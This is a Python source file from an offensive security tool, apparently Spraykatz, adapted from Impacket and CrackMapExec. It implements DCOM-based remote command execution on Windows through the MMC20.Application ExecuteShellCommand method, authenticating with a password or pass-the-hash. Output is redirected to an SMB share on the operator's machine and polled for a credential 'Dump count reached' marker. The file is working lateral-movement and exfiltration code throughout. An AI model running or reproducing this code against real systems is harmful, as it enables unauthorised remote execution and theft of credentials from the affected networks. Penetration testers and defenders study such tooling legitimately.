# coding: utf-8
#
# This file comes from Impacket & CrackMapExec project
# Slightly modified for Spraykatz.


# Imports
import logging
import os
import time
from gevent import sleep

from core.Utils import *
from impacket import version
from impacket.dcerpc.v5.dcom.oaut import IID_IDispatch, string_to_bin, IDispatch, DISPPARAMS, DISPATCH_PROPERTYGET, \
    VARIANT, VARENUM, DISPATCH_METHOD
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcomrt import OBJREF, FLAGS_OBJREF_CUSTOM, OBJREF_CUSTOM, OBJREF_HANDLER, \
    OBJREF_EXTENDED, OBJREF_STANDARD, FLAGS_OBJREF_HANDLER, FLAGS_OBJREF_STANDARD, FLAGS_OBJREF_EXTENDED, \
    IRemUnknown2, INTERFACE
from impacket.dcerpc.v5.dtypes import NULL
from impacket.examples import logger
from impacket.smbconnection import SMBConnection, SMB_DIALECT, SMB2_DIALECT_002, SMB2_DIALECT_21


class MMCEXEC:
    def __init__(self, host, share_name, username, password, domain, smbconnection, hashes=None):
        self.__host = host
        self.__username = username
        self.__password = password
        self.__smbconnection = smbconnection
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__share_name = share_name
        self.__output = None
        self.__outputBuffer = ''
        self.__shell = 'c:\\windows\\system32\\cmd.exe'
        self.__pwd = 'C:\\'
        self.__quit = None
        self.__executeShellCommand = None
        self.__retOutput = True
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

        dcom = DCOMConnection(self.__host, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, None, oxidResolver=True)

        try:
            iInterface = dcom.CoCreateInstanceEx(string_to_bin('49B2791A-B1AE-4C90-9B8E-E860BA07F889'), IID_IDispatch)
            iMMC = IDispatch(iInterface)

            resp = iMMC.GetIDsOfNames(('Document',))

            dispParams = DISPPARAMS(None, False)
            dispParams['rgvarg'] = NULL
            dispParams['rgdispidNamedArgs'] = NULL
            dispParams['cArgs'] = 0
            dispParams['cNamedArgs'] = 0
            resp = iMMC.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
 
            iDocument = IDispatch(self.getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
 
            resp = iDocument.GetIDsOfNames(('ActiveView',))
            resp = iDocument.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
 
            iActiveView = IDispatch(self.getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
 
            pExecuteShellCommand = iActiveView.GetIDsOfNames(('ExecuteShellCommand',))[0]
 
            pQuit = iMMC.GetIDsOfNames(('Quit',))[0]
 
            self.__quit = (iMMC, pQuit)
            self.__executeShellCommand = (iActiveView, pExecuteShellCommand)

        except Exception as e:
            dcom.disconnect()
            self.exit()

    def getInterface(self, interface, resp):
        objRefType = OBJREF(''.join(resp))['flags']

        objRef = None
        if objRefType == FLAGS_OBJREF_CUSTOM:
            objRef = OBJREF_CUSTOM(''.join(resp))
        elif objRefType == FLAGS_OBJREF_HANDLER:
            objRef = OBJREF_HANDLER(''.join(resp))
        elif objRefType == FLAGS_OBJREF_STANDARD:
            objRef = OBJREF_STANDARD(''.join(resp))
        elif objRefType == FLAGS_OBJREF_EXTENDED:
            objRef = OBJREF_EXTENDED(''.join(resp))
        else:
            logging.error("Unknown OBJREF Type! 0x%x" % objRefType)

        return IRemUnknown2(
            INTERFACE(interface.get_cinstance(), None, interface.get_ipidRemUnknown(), objRef['std']['ipid'],
                      oxid=objRef['std']['oxid'], oid=objRef['std']['oxid'],
                      target=interface.get_target()))

    def execute(self, command, output=False):
        self.__retOutput = output  
        self.execute_remote(command)
        self.exit()
        return self.__outputBuffer

    def exit(self):
        dispParams = DISPPARAMS(None, False)
        dispParams['rgvarg'] = NULL
        dispParams['rgdispidNamedArgs'] = NULL
        dispParams['cArgs'] = 0
        dispParams['cNamedArgs'] = 0

        self.__quit[0].Invoke(self.__quit[1], 0x409, DISPATCH_METHOD, dispParams,
                                             0, [], [])
        return True

    def execute_remote(self, data):
        self.__output = gen_random_string(6)
        local_ip = self.__smbconnection.getSMBServer().get_socket().getsockname()[0]

        command = '/Q /c ' + data
        if self.__retOutput is True:
            command += ' 1> ' + 'net use \\\\{}\\ && \\\\{}\\tmp\\{}'.format(local_ip, local_ip, self.__output) + ' 2>&1'

        dispParams = DISPPARAMS(None, False)
        dispParams['rgdispidNamedArgs'] = NULL
        dispParams['cArgs'] = 4
        dispParams['cNamedArgs'] = 0
        arg0 = VARIANT(None, False)
        arg0['clSize'] = 5
        arg0['vt'] = VARENUM.VT_BSTR
        arg0['_varUnion']['tag'] = VARENUM.VT_BSTR
        arg0['_varUnion']['bstrVal']['asData'] = self.__shell

        arg1 = VARIANT(None, False)
        arg1['clSize'] = 5
        arg1['vt'] = VARENUM.VT_BSTR
        arg1['_varUnion']['tag'] = VARENUM.VT_BSTR
        arg1['_varUnion']['bstrVal']['asData'] = self.__pwd

        arg2 = VARIANT(None, False)
        arg2['clSize'] = 5
        arg2['vt'] = VARENUM.VT_BSTR
        arg2['_varUnion']['tag'] = VARENUM.VT_BSTR
        arg2['_varUnion']['bstrVal']['asData'] = command

        arg3 = VARIANT(None, False)
        arg3['clSize'] = 5
        arg3['vt'] = VARENUM.VT_BSTR
        arg3['_varUnion']['tag'] = VARENUM.VT_BSTR
        arg3['_varUnion']['bstrVal']['asData'] = '7'
        dispParams['rgvarg'].append(arg3)
        dispParams['rgvarg'].append(arg2)
        dispParams['rgvarg'].append(arg1)
        dispParams['rgvarg'].append(arg0)

        self.__executeShellCommand[0].Invoke(self.__executeShellCommand[1], 0x409, DISPATCH_METHOD, dispParams,
                                             0, [], [])
        self.get_output_fileless()

    def output_callback(self, data):
        self.__outputBuffer += data

    def get_output_fileless(self):
        if not self.__retOutput: return

        while True:
            try:
                with open(os.path.join(os.path.dirname(os.path.realpath(sys.argv[0])), 'misc', 'tmp', self.__output), 'r') as output:
                    out = output.read()
                    if "Dump count reached" in out:
                        self.output_callback(output.read())
                        break
                    else:
                        time.sleep(0.5)
            except IOError:
                sleep(2)
